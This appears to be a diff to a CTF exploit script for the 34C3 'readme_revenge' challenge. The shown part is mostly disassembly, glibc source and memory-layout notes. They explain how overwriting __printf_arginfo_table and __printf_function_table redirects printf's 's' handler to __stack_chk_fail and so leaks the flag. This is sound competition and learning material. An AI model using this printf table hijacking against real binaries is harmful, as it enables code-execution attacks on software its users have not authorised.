@@ -38,6 +38,28 @@ $2 = 0x4141414141414141
 
 gef➤  print $rdx
 $3 = 0x73
+
+rax+rdx*8 --> __printf_arginfo_table + 's'*8 and we can control __printf_arginfo_table.
+
+[0x00000000]> pd 20 @ 0x45ad08
+|           ; DATA XREF from 0x00467aa8 (fcn.00467aa8)
+|           0x0045ad08    488b0d99cd2. mov rcx, [rip+0x25cd99] ; 0x00467aa8
+|           0x0045ad0f    488b04d1     mov rax, [rcx+rdx*8]
+|           0x0045ad13    4885c0       test rax, rax
+|           0x0045ad16    0f84dcfcffff jz 0x45a9f8
+|           0x0045ad1c    488d4b40     lea rcx, [rbx+0x40]
+|           0x0045ad20    488d5334     lea rdx, [rbx+0x34]
+|           0x0045ad24    be01000000   mov esi, 0x1
+|           0x0045ad29    4889df       mov rdi, rbx
+|           0x0045ad2c    ffd0         call rax <-- !!!!!
+|
+
+if (__builtin_expect (__printf_function_table == NULL, 1)
+    || spec->info.spec > UCHAR_MAX
+    || __printf_arginfo_table[spec->info.spec] == NULL
+    || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
+                                    (&spec->info, 1, &spec->data_arg_type,
+                                    &spec->size)) < 0)
 """
 
 r = process('./readme_revenge')
@@ -66,14 +88,14 @@ gef➤  x/s 0x6b4040
 # ARGV[0] --> "34C3_XXX..."
 0x6b7990 <__gconv_lock>:        0x40    0x40    0x6b    0x00    0x00    0x00    0x00    0x00
 
-# __printf_modifier_func_ptr_tbl['s'] --> __stack_chk_fail()
+# __printf_arginfo_table['s'] --> __stack_chk_fail()
 0x6b77b8 <_dl_static_dtv+920>:  0x00    0x00    0x00    0x00    0xB0    0x59    0x43    0x00
 0x6b77c0 <_dl_static_dtv+928>:  0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
 
-# __printf_modifier_func_ptr_tbl --> 0x6b7424
-0x6b7a28 <__printf_function_table>:     0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00
+# __printf_function_table --> 0x01 (only have to be non-NULL)
+0x6b7a28 <__printf_function_table>:     0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
 
-# __printf_modifier_func_ptr_tbl --> 0x6b7424
+# __printf_arginfo_table --> 0x6b7424 --> 0x6b7424 + 0x73*8 == __printf_arginfo_table['s']
 0x6b7aa8 <__printf_arginfo_table>:      0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00
 '''
 
